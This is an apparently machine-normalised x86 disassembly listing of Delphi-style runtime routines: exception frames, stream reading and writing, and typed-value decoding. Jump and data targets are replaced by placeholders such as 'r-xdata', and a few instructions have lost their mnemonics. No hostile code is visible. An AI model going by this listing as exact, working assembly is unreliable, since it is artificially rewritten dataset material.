lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415668
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41cd58
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d29c
pop ecx
jmp r-xdata
sub_41d700
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_4041b8
jmp r-xdata
mov eax [ ebx ]
call sub_4182a0
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409098
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d760
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41da7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db48
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41da59
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41da1a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
mov eax [ ebp - 0x1c ]
call sub_417df8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d700
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4032b0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417b48
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d9bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406234
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418744
xor eax eax
push ebp
push sub_41d99f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4188fc
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9a6
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403368
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4188a0
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d9f0
call sub_40277c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403b98
jmp r-xdata
call sub_403b44
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41baf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da60
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41da1f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41bc9c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403b44
call sub_403b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da60
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403368
sub_41da8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41db36
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41db09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41dd48
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414acc
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41bde4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41be1c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db3d
lea eax [ ebp - 0x8 ]
call sub_404164
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41db6c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c30c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404254
mov eax esi
call j_sub_404630#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c30c
pop edx
pop esi
pop ebx
retn
sub_41dba8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dc55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c2e8
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41dc64
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4043ec
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc5c
lea eax [ ebp - 0x8 ]
call sub_404844
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41dd48
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c30c
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047b0
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c30c
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c30c
jmp r-xdata
jmp r-xdata
call sub_41bde4
sub_41dc64
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dd3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c2e8
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41dba8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404990
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd42
lea eax [ ebp - 0xc ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404164
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41dd48
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c30c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404a8c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c30c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c30c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4047b0
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c30c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405ed4
jmp r-xdata
jmp r-xdata
call sub_41bde4
sub_41dd5c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41dd98
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41db6c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd9f
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41dda4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bfa4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41de58
mov eax [ ebx ]
call sub_41cf10
pop ebx
pop ebp
retn
sub_41ddcc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c30c
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e250
pop ebx
pop ecx
pop ebp
retn
sub_41ddfc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bfa4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c2e8
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41cf10
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41e250
jmp r-xdata
mov eax [ ebx ]
call sub_41de58
mov eax [ ebx ]
call sub_41bfa4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41dff4
mov eax [ ebx ]
call sub_41cf10
sub_41de58
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dfe7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41dd48
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfee
lea eax [ ebp - 0x8 ]
call sub_404164
retn
jmp [ eax * 4 + jump_table_41de8f ]
push ebp
call sub_41dda4
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41db6c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ddcc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd5c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ddcc
pop ecx
jmp r-xdata
push ebp
call sub_41ddfc
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
push ebp
mov eax 0x2
call sub_41ddcc
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e250
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ddcc
pop ecx
sub_41dff4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e031
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41db6c
mov eax ebx
call sub_41de58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e038
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41e03c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41e0d4
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41bfa4
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41db6c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41db6c
jmp r-xdata
mov eax ebx
call sub_41dff4
mov eax ebx
call sub_41cf10
jmp r-xdata
mov eax ebx
call sub_41bfa4
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41e03c
mov eax ebx
call sub_41cf10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0db
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
sub_41e0e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e189
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4041fc
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42168c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e190
lea eax [ ebp - 0x8 ]
call sub_404164
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
sub_41e1b4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41e1dc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c23c
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417d38
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_40357c
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c23c
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e250
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c30c
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c30c
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e298
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41be70
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e41c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c30c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41ad9c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c30c
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b72c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e3f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41dba8
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c30c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41ad9c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c30c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414744
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
lea eax [ ebp - 0x1c ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d4c4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3fe
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_41e460
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e65a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f178
mov eax [ ebp - 0x4 ]
call sub_41c2e8
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
jmp [ eax * 4 + jump_table_41e4a2 ]
mov eax [ ebp - 0x4 ]
call sub_41dd48
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce58
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_413308
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce58
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_413308
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce58
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413308
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc3c
mov eax ebx
call sub_413500
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc80
mov eax ebx
call sub_413500
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ccc4
mov eax ebx
call sub_413528
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd14
mov eax ebx
call sub_413514
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dba8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41353c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41dc64
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413568
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd48
cmp al 0x9
sete dl
mov eax ebx
call sub_4134d8
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e298
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f4a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cec4
push edx
push eax
mov eax ebx
call sub_413404
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e661
lea eax [ ebp - 0x1c ]
call sub_40f18c
lea eax [ ebp - 0xc ]
call sub_404844
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov eax ebx
call sub_41482c
jmp r-xdata
sub_41e668
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_41e834
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b774
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_41e6a0
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420744
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e6c8
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420744
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e7ac
sub_41e70c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41ad18
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e834
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41ad38
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e760
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e834
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e7ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e823
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_420980
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e760
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e82a
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_41e860
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e8a3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40434c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8aa
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41e8b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41e942
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_420980
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f11c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e949
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41f114
mov edx esi
mov eax edi
call sub_419630
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f168
mov eax [ ebp - 0x4 ]
call sub_41f11c
inc esi
dec ebx
jne r-xdata
sub_41e950
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4188a0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
